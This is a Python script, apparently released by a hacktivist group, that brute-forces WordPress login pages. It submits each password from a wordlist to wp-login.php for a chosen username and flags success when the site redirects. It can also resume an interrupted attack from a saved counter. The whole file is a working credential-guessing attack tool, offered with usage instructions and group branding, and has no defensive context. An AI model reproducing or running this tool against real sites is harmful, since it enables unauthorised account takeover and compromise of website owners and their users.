#!/usr/bin/python3
#coding:utf-8

#23/05/2020
#happy eid mubarak 1441H
#creator  : Rex4
#developed: Cantix Crew
#greetz   : all indonesian hacktivist
#instagram.com/cantixcr3w
#facebook.com/cantixcr3w
#twitter.com/cantixcr3w
#cantixcr3w@yahoo.com
#icq: @leexaaaa
#skype: live:.cid.af8a8a259ed02c40
#thanks for use our tools.

import argparse
import requests
from urlparse import urlparse

def reportarError(error):
    print """[INFO] ERROR!
{bars}
{error}
{bars}

https://twitter.com/cantixcr3w
thanks for support us!
""".format(error=error.message, bars="-"*len(error.message))


def attack(target, user, passlist, restore = False):

    target = urlparse(target)

    if target.scheme == "":
        target = "http://{}".format(target.geturl())
    else:
        target = target.geturl()

    print "Target: {}\n".format(target)

    passlist = open(passlist, 'r')
    passlist = passlist.readlines()

    iteration = open('iteration.txt','a+')
    iteration.seek(0,0)
    content_iteration = iteration.readlines()

    if len(content_iteration) == 0:
        iteration.write("1\n")
        iteration.close()
        
    iteration = open('iteration.txt','r+')
    content_iteration = iteration.readlines()
    iteration.close()

    aux = passlist
    cont = 1
    Found = False

    if restore:
        print "[*] Restoring Attack\n"
        last_value_iteration = int(str(content_iteration[len(content_iteration)-1]).strip())
        aux = aux[last_value_iteration-1:]
        if len(aux) == 0:
            cont = 1
            aux = passlist
        else:
            cont = last_value_iteration

    
    for password in aux:
        with open('iteration.txt','w') as iteration:
            try:
                cabeceras = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                }

                payload = {
                    'log': user.strip(),
                    'pwd': password.strip()
                }

                response = requests.post(target, data=payload, headers=cabeceras, allow_redirects=False)

                if response.status_code in [302, 303]:
                    print '[INFO]%d %s  <----- FOUND' % (cont,password.strip())
                    cont = 0
                    Found = True
                    break
                elif response.status_code == 200:
                    print '[INFO]%d %s NOT FOUND' % (cont,password.strip())
                else:
                    print '[INFO]Error!!!!'

            except KeyboardInterrupt:
                print '\n [INFO]Execution terminated by keyboard '
                cont -= 1
                exit()
            except Exception as e:
                reportarError(e)
                exit()
            finally:
                cont += 1
                iteration.write(str(cont)+'\n')

    if not Found:
        print "\ Sorry,can't get password\n"


def conexion():
    parser = argparse.ArgumentParser(
            usage="cantix.py -t [http://cantixcr3w.tld/wp-login.php] -u [rex4] -p [password.txt]",
            add_help=False,        
    )
    
    authors = ['@cantixcr3w']
    collaborators = ['@Rex4']

    print """                     ______               _
      @cantixcr3w    | ___ \             | |        
    __      __ _ __  | |_/ / _ __  _   _ | |_   ___ 
    \ \ /\ / /| *_ \ | ___ \| *__|| | | || __| / _ \\    
     \ V  V / | |_) || |_/ /| |   | |_| || |_ |  __/
      \_/\_/  | .__/ \____/ |_|    \__,_| \__| \___|
              | |                                   
              |_|    wordpress bruteforce                           
    
    """.format(
        authors=', '.join(authors),
        collaborators=', '.join(collaborators)
    )
    
    parser.add_argument("-h", "--help", action="help", help=" How User This Tool ")
    parser.add_argument("-t", dest='target', help="For Example : localhost/wordpress/wp-login.php")
    parser.add_argument("-u", dest='user', help="username 0f Target")
    parser.add_argument("-p", dest='passlist', help="address passlist for brute force")
    parser.add_argument("-r", dest='restore', action="store_true", help="Restore the last session of the attack")
    args = parser.parse_args()
    
    if args.target and args.user and args.passlist:
        attack(args.target, args.user, args.passlist, args.restore)
    else:
        parser.print_help()


if __name__ == '__main__':
	conexion()
